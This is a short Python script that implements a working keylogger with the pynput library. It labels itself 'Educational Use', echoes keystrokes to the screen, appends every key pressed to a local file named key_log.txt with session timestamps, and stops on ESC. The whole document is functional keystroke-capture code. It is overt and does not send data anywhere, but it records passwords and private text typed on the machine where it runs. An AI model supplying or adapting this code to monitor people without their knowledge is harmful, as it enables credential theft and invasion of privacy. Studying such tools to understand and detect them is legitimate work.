from pynput import keyboard
from datetime import datetime

log_file = "key_log.txt"

print("Key Logger Started (Educational Use)")
print("Type something... Press ESC to stop.\n")

def on_press(key):
    try:
        print(key.char, end="", flush=True)   # SHOW typed key
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        print(f"[{key}]", end="", flush=True)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\n\nKey Logger Stopped")
        return False

with open(log_file, "a") as f:
    f.write("\n\n--- Session Started: " + str(datetime.now()) + " ---\n")

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release
) as listener:
    listener.join()


